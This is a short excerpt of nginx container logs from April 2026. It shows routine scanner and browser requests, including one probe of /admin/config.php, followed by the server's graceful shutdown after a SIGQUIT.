+2026-04-08T21:43:13.208626662Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:43:13 +0000] "GET / HTTP/1.1" 200 423 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
+2026-04-08T21:59:59.040553840Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:59:59 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
+2026-04-08T22:10:02.238534573Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:10:02 +0000] "GET /admin/config.php HTTP/1.0" 200 423 "-" "xfa1" "-"
+2026-04-08T22:20:46.509983427Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:20:46 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
+2026-04-08T22:26:41.957306000Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:26:41 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
+2026-04-08T22:33:48.653903586Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:33:48 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 zgrab/0.x" "-"
+2026-04-08T22:41:09.328233653Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:41:09 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "-"
+2026-04-08T22:41:09.482224283Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:41:09 +0000] "GET /robots.txt HTTP/1.1" 200 423 "-" "-" "-"
+2026-04-08T22:41:09.751701162Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:41:09 +0000] "GET /sitemap.xml HTTP/1.1" 200 423 "-" "-" "-"
+2026-04-08T22:41:10.132038884Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:41:10 +0000] "GET /.well-known/security.txt HTTP/1.1" 200 423 "-" "-" "-"
+2026-04-08T22:41:10.595709529Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:22:41:10 +0000] "GET /favicon.ico HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36" "-"
+2026-04-08T23:08:34.443421327Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2026-04-08T23:08:34.444281777Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 7#7: gracefully shutting down
+2026-04-08T23:08:34.445076477Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 8#8: gracefully shutting down
+2026-04-08T23:08:34.454402866Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 7#7: exiting
+2026-04-08T23:08:34.457426565Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 8#8: exiting
+2026-04-08T23:08:34.637627292Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 7#7: exit
+2026-04-08T23:08:34.637665002Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 8#8: exit
+2026-04-08T23:08:34.888298804Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 1#1: signal 17 (SIGCHLD) received from 7
+2026-04-08T23:08:34.888958624Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 1#1: worker process 7 exited with code 0
+2026-04-08T23:08:34.888968404Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 1#1: worker process 8 exited with code 0
+2026-04-08T23:08:34.890283534Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 23:08:34 [notice] 1#1: exit
